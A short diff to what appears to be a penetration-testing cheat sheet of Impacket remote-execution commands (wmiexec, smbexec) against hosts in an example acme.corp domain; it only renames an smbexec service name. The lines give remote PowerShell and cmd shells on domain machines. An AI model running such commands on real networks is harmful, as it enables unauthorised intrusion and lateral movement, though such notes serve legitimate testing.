@@ -79,7 +79,7 @@ impacket-wmiexec -k -no-pass -dc-ip 192.168.1.5 -shell-type powershell acme.corp
   
 ```
 
-smbexec.py Administrator@WS01.acme.corp -dc-ip 10.10.12.25 -shell-type powershell -service-name hello -share admin$
+smbexec.py Administrator@WS01.acme.corp -dc-ip 10.10.12.25 -shell-type powershell -service-name byinarie -share admin$
 
 smbexec.py admin@WS02.acme.corp -dc-ip 10.10.12.25 -shell-type cmd
 
